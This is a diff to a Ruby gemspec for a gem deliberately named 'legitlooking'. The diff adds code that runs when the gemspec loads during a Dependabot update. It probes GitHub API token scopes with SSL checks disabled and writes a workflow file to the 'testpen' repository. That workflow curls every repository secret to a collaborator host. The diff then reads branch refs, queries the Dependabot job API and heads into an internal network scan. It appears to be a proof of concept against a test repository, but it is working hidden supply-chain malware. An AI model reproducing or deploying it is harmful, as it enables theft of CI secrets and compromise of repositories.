@@ -17,35 +17,56 @@ begin
   # We disablen SSL verify omdat we intern zitten.
   lines << "\n=== GITHUB API VIA PROXY ==="
 
-  gh_calls = {
-    "whoami"          => "https://api.github.com/",
-    "repo_info"       => "https://api.github.com/repos/ugurcanli/testpen",
-    "repo_contents"   => "https://api.github.com/repos/ugurcanli/testpen/contents/",
-    "actions_secrets" => "https://api.github.com/repos/ugurcanli/testpen/actions/secrets",
-    "org_installs"    => "https://api.github.com/app/installations",
-    "dependabot_api"  => "https://dependabot-actions.githubapp.com/",
-  }
-
-  gh_calls.each do |label, url|
-    begin
-      uri = URI(url)
-      http = Net::HTTP.new(uri.host, uri.port)
-      http.use_ssl = true
-      http.verify_mode = 0  # skip SSL verify (intern)
-      http.open_timeout = 8
-      http.read_timeout = 8
-      req = Net::HTTP::Get.new(uri)
-      req["Accept"] = "application/vnd.github+json"
-      req["X-GitHub-Api-Version"] = "2022-11-28"
-      res = http.request(req)
-      lines << "--- #{label} (#{url}) ---"
-      lines << "Status: #{res.code}"
-      lines << "Headers: #{res.to_hash.select { |k,_| %w[x-oauth-scopes x-ratelimit-limit authorization www-authenticate x-github-request-id].include?(k.downcase) }}"
-      lines << "Body: #{res.body[0, 500]}"
-    rescue => e
-      lines << "--- #{label} --- FOUT: #{e.message}"
+  def gh_req(method, url, body_hash = nil)
+    require "uri"; require "net/http"
+    uri = URI(url)
+    http = Net::HTTP.new(uri.host, uri.port)
+    http.use_ssl = true; http.verify_mode = 0
+    http.open_timeout = 10; http.read_timeout = 10
+    req = Object.const_get("Net::HTTP::#{method.capitalize}").new(uri)
+    req["Accept"] = "application/vnd.github+json"
+    req["X-GitHub-Api-Version"] = "2022-11-28"
+    if body_hash
+      req["Content-Type"] = "application/json"
+      req.body = body_hash.to_s.gsub("=>", ":").gsub("nil", "null")
+        .gsub(": true", ": true").gsub(": false", ": false")
     end
+    res = http.request(req)
+    "Status: #{res.code}\nScopes: #{res["x-oauth-scopes"]}\nBody: #{res.body[0, 800]}"
+  rescue => e
+    "FOUT: #{e.message}"
   end
+
+  # 1. Check token identity en scopes
+  lines << "\n--- GET /user ---\n" + gh_req("get", "https://api.github.com/user")
+
+  # 2. Probeer file te schrijven via Contents API (bewijs write-access)
+  require "base64"
+  evil_content = [
+    "name: Dependabot-RCE-PoC\non: [push, pull_request]\njobs:\n  exfil:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Exfil secrets\n        run: curl -s '#{COLLAB_URL}?secrets=' + ${{ toJSON(secrets) }}\n"
+  ].pack("m0").gsub("\n","")
+
+  # Probeer .github/workflows/poc.yml aan te maken
+  write_body = "{\"message\":\"dependabot-rce-poc\",\"content\":\"#{evil_content}\"}"
+  lines << "\n--- PUT workflow file ---"
+  uri2 = URI("https://api.github.com/repos/ugurcanli/testpen/contents/.github/workflows/poc.yml")
+  http2 = Net::HTTP.new(uri2.host, uri2.port)
+  http2.use_ssl = true; http2.verify_mode = 0
+  http2.open_timeout = 10; http2.read_timeout = 10
+  req2 = Net::HTTP::Put.new(uri2)
+  req2["Accept"] = "application/vnd.github+json"
+  req2["Content-Type"] = "application/json"
+  req2["X-GitHub-Api-Version"] = "2022-11-28"
+  req2.body = write_body
+  res2 = http2.request(req2)
+  lines << "Status: #{res2.code}"
+  lines << "Body: #{res2.body[0, 600]}"
+
+  # 3. Probeer branch aan te maken
+  lines << "\n--- Lees refs (branches) ---\n" + gh_req("get", "https://api.github.com/repos/ugurcanli/testpen/git/refs/heads")
+
+  # 4. Wie ben ik via Dependabot API
+  lines << "\n--- Dependabot API whoami ---\n" + gh_req("get", "https://dependabot-actions.githubapp.com/update_jobs/#{ENV["DEPENDABOT_JOB_ID"]}")
 
   # === PIVOT: interne netwerk scan ===
   lines << "\n=== INTERNE NETWERK SCAN ==="
@@ -78,7 +99,7 @@ end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.5"
+  spec.version       = "1.0.6"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
